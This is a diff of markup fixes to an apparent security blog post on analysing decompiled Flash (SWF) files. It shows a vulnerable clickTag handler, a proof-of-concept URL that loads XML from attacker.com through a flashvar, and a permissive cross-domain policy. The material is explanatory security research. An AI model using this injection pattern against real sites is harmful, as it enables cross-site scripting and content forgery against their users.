@@ -69,13 +69,15 @@ In terms of performing the analysis, SWF files can be decompiled through various
 The main objective with the code analysis is to get an overview of the code flow, how variables are handled and if possible, how to manipulate such variables. For example, look for lack of input sanitization, undefined flashvars, use of the mentioned insecure global variables and method calls. If any of the above global variables are declared but remain undefined, then it is likely that the SWF will be vulnerable.
 
 For example, see a vulnerable decompiled source below:
-<pre class="hack dark"><i>
+<pre class="hack dark">
+<i>
 button 48 {
 	on (release) {
 		var str = (_level0.clickTag != undefined) ? _level0.clickTag
 			getURL(str, '');
 	}
-   }</i>
+   }
+</i>
 </pre>
 <p>The above illustrates a vulnerability pertinent to the clickTag flashvar. An analysis on the above can be observed <a href="posts/ASD-XSSposed.html">here</a>.<p>
 <p>Vulnerabilities that could exist within Shockwave Flash files include; SOME attacks, Content Forgery, Unvalidated Redirects, as well as, XSS.</p>
@@ -92,7 +94,7 @@ This would then be called in the manner of:<br>
 	http://example.com/swf/example.swf?xml_path=//attacker.com/poc.xml
 
 <p>It should be noted that as a precondition, a permissive cross-domain policy needs to be configured:</p>
-<pre class="hack dark"
+<pre class="hack dark">
 <?xml version="1.0"?>
 <!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
 <cross-domain-policy>
